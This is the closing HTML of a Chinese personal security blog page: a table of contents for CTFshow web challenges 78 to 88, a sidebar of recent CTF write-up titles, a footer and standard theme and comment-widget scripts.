class="toc-text">web78:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web79%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">web79：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web80%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">web80：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web81%EF%BC%9A"><span class="toc-number">2.4.</span> <span class="toc-text">web81：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web82%EF%BC%9A"><span class="toc-number">2.5.</span> <span class="toc-text">web82：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web87%EF%BC%9A"><span class="toc-number">2.6.</span> <span class="toc-text">web87：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web88%EF%BC%9A"><span class="toc-number">2.7.</span> <span class="toc-text">web88：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">2.8.</span> <span class="toc-text">参考：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/01/25/ctfshow-ssrf/" title="【CTFSHOW】 web入门SSRF"><img src="/222.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CTFSHOW】 web入门SSRF"/></a><div class="content"><a class="title" href="/2022/01/25/ctfshow-ssrf/" title="【CTFSHOW】 web入门SSRF">【CTFSHOW】 web入门SSRF</a><time datetime="2022-01-25T06:55:44.000Z" title="发表于 2022-01-25 06:55:44">2022-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/14/ctfshow-sqli/" title="【CTFSHOW】 web入门sql注入"><img src="/222.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CTFSHOW】 web入门sql注入"/></a><div class="content"><a class="title" href="/2022/01/14/ctfshow-sqli/" title="【CTFSHOW】 web入门sql注入">【CTFSHOW】 web入门sql注入</a><time datetime="2022-01-14T10:47:34.000Z" title="发表于 2022-01-14 10:47:34">2022-01-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/10/fileinc/" title="【CTFSHOW】 web入门文件包含"><img src="/222.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CTFSHOW】 web入门文件包含"/></a><div class="content"><a class="title" href="/2022/01/10/fileinc/" title="【CTFSHOW】 web入门文件包含">【CTFSHOW】 web入门文件包含</a><time datetime="2022-01-10T07:29:38.000Z" title="发表于 2022-01-10 07:29:38">2022-01-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/31/ctfshow-nodejs/" title="【CTFSHOW】 web入门nodejs"><img src="/222.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CTFSHOW】 web入门nodejs"/></a><div class="content"><a class="title" href="/2021/12/31/ctfshow-nodejs/" title="【CTFSHOW】 web入门nodejs">【CTFSHOW】 web入门nodejs</a><time datetime="2021-12-31T08:14:10.000Z" title="发表于 2021-12-31 08:14:10">2021-12-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/28/xss-strange/" title="那些看不懂的操作【alert无数字字母有效载荷】"><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/xsscover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="那些看不懂的操作【alert无数字字母有效载荷】"/></a><div class="content"><a class="title" href="/2021/09/28/xss-strange/" title="那些看不懂的操作【alert无数字字母有效载荷】">那些看不懂的操作【alert无数字字母有效载荷】</a><time datetime="2021-09-28T15:58:30.000Z" title="发表于 2021-09-28 15:58:30">2021-09-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022  <i id="heartbeat" class="fa fas fa-heartbeat"></i> ZEPHeyrr</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'emcbjtpAX6FKY93aCdO8qk2c-MdYXbMMI',
+      appKey: 'XJI9fJqbm71pDTHE92oWaWPA',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><script defer src="https://cdn.jsdelivr.net/combine/npm/jquery@latest/dist/jquery.min.js,gh/weilining/jsdelivr/jquery/circlemagic/circlemagic.min.js,gh/weilining/jsdelivr@latest/jquery/circlemagic/butterflycirclemagic.js"></script><script src="/js/feet.js"></script><script src="/js/snow.js"></script><script src="https://cdn.jsdelivr.net/gh/xiabo2/CDN@latest/fishes.js"></script><script src="https://cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
